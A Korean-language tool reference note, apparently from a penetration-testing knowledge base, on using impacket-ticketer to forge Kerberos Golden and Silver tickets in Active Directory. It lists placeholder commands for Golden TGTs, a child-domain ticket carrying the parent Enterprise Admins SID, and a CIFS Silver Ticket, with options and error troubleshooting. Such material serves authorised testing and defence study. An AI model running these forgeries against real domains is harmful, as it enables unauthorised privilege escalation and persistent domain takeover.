---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 기능/권한상승
실행환경: ["Linux"]
필요권한: ["ticket 서명에 사용할 krbtgt 또는 서비스 계정 key 사용 가능"]
필요조건: ["도메인 SID", "ticket 사용자 이름과 RID", "Golden Ticket은 krbtgt key, Silver Ticket은 대상 서비스 key와 SPN"]
결과: ["Kerberos ccache ticket"]
---

# impacket-ticketer

## 도구 개요

`impacket-ticketer`는 도메인 또는 서비스 key로 Golden TGT와 Silver TGS를 만들어 ccache 파일로 저장한다. 사용자·그룹·ExtraSids와 SPN을 지정해 Kerberos ticket의 PAC와 서비스 범위를 구성할 때 사용하며, 파일 생성 성공만으로 실제 서비스 권한이 보장되지는 않는다.

## 필요한 입력과 실행 환경

- 실행 위치: Impacket이 설치된 Linux 호스트. ticket 생성 자체는 DC 연결이 필요하지 않지만, 생성한 TGT로 새 TGS를 요청하려면 KDC TCP/UDP 88번에 접근해야 한다.
- Golden Ticket 입력: `<DOMAIN_SID>`, `<DOMAIN>`, `krbtgt` NT hash 또는 AES key, ticket에 넣을 사용자 이름과 RID.
- Silver Ticket 입력: 서비스 계정·컴퓨터 계정 key와 `<SERVICE>/<HOST_FQDN>` SPN.
- 같은 포리스트 cross-domain ExtraSids 입력: 부모 도메인 SID와 대상 그룹 RID를 결합한 SID. forest·external trust에 일반화하지 않고 SID filtering 경계를 별도 확인한다.
- 환경에 따라 KDC가 ticket의 클라이언트 계정 이름을 확인한다. 재현성과 오류 진단을 위해 실제로 존재하는 사용자 이름과 일치하는 RID를 사용한다.

## 표준 사용법

```bash
impacket-ticketer -domain <DOMAIN> -domain-sid <DOMAIN_SID> (-nthash <NT_HASH> | -aesKey <AES_KEY>) [options] <USER>
```

## 대표 예시

### Golden TGT 생성

```bash
impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -user-id <USER_RID> <USER>
```

### AES key로 Golden TGT 생성

```bash
impacket-ticketer -aesKey <KRBTGT_AES_KEY> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -user-id <USER_RID> <USER>
```

### 부모 Enterprise Admins SID를 포함한 자식 도메인 TGT 생성

```bash
impacket-ticketer -nthash <CHILD_KRBTGT_NT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ROOT_DOMAIN_SID>-519 -user-id <CHILD_USER_RID> <CHILD_USER>
```

### 특정 CIFS SPN의 Silver Ticket 생성

```bash
impacket-ticketer -nthash <SERVICE_ACCOUNT_NT_HASH> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -spn cifs/<HOST_FQDN> -user-id <USER_RID> <USER>
```

확인할 출력:

- `Saving ticket in <USER>.ccache`와 실제 ccache 파일 생성.
- 생성 성공은 로컬 ticket 작성만 뜻한다. `KRB5CCNAME` 지정, `klist`, KDC 또는 대상 서비스 응답으로 실제 사용 가능성을 별도 확인한다.

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-nthash` | ticket 서명에 사용할 NT hash | RC4 기반 `krbtgt` 또는 서비스 계정 key를 보유했을 때 |
| `-aesKey` | ticket 서명에 사용할 AES key | 도메인·서비스가 AES를 사용하거나 AES key를 확보했을 때 |
| `-domain` | ticket realm에 넣을 DNS 도메인명 | Golden·Silver Ticket 모두 필요 |
| `-domain-sid` | ticket 사용자와 그룹 SID의 도메인 부분 | PAC의 SID를 구성할 때 |
| `-user-id` | ticket 사용자 RID | 실제 사용자 SID와 맞춰야 하는 환경에서 중요 |
| `-groups` | PAC에 넣을 그룹 RID 목록 | 기본 그룹 구성을 명시적으로 바꿀 때 |
| `-extra-sid` | 다른 도메인·그룹 SID를 PAC의 추가 SID에 포함 | 같은 포리스트 자식→부모 ExtraSids 경로 |
| `-spn` | TGT 대신 특정 서비스 TGS 생성 | 서비스 key를 가진 Silver Ticket |
| `-request` | 실제 KDC ticket을 템플릿으로 요청한 뒤 PAC를 수정 | 실제 사용자 credential과 KDC 접근이 있고 버전별 PAC 차이를 줄여야 할 때 |
| `-user`, `-password` | `-request`에 사용할 실제 인증 계정 | KDC에 템플릿 ticket을 요청할 때 |
| `-duration` | ticket 유효 기간 | 시험·검증 범위에 맞게 기간을 제한할 때. 버전에 따라 일 또는 시간 단위이므로 로컬 `impacket-ticketer -h` 확인 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `Creating basic skeleton ticket` | 로컬 기본 구조로 ticket 생성 중 | 저장된 ccache와 입력한 domain·SID·user·RID 확인 |
| `Requesting ticket to domain` | `-request`로 KDC 발급 ticket 요청 중 | 실제 인증 계정, KDC 도달성·시간 확인 |
| `Saving ticket in ...ccache` | ccache 파일 작성 성공 | 같은 shell에서 `KRB5CCNAME`과 `klist` 확인 |
| 생성한 ticket 사용 중 `KDC_ERR_C_PRINCIPAL_UNKNOWN` | 실제 KDC가 ticket client를 찾지 못함 | 임의 이름 대신 존재하는 사용자와 해당 RID 사용 |
| `KRB_AP_ERR_MODIFIED` | 서명 key·SPN·대상 서비스가 일치하지 않을 가능성 | `krbtgt`/서비스 key와 SPN·도메인 확인 |
| ticket은 생성되지만 서비스 접근 거부 | 작성 성공과 권한 평가는 별개 | PAC SID, 계정 권한, SID filtering과 대상 서비스 ACL 확인 |

## 버전과 환경 차이

일부 환경은 존재하지 않는 사용자 이름이 들어간 위조 TGT도 처리하지만, 다른 KDC·Impacket 조합에서는 service ticket 요청 중 `KDC_ERR_C_PRINCIPAL_UNKNOWN`이 발생한다. 실제 사용자와 RID를 사용하는 것을 기본 절차로 둔다.

`-duration`은 오래된 버전에서 일 단위였고 현재 버전에서는 시간 단위다. 장기 ticket을 그대로 만들지 말고 설치된 버전의 `-h` 출력으로 단위를 확인한다.

## 관련 공격기법

- [[자식 도메인 ExtraSids Golden Ticket]]
- [[Pass the Ticket]]

## 참고 링크

- [Impacket ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
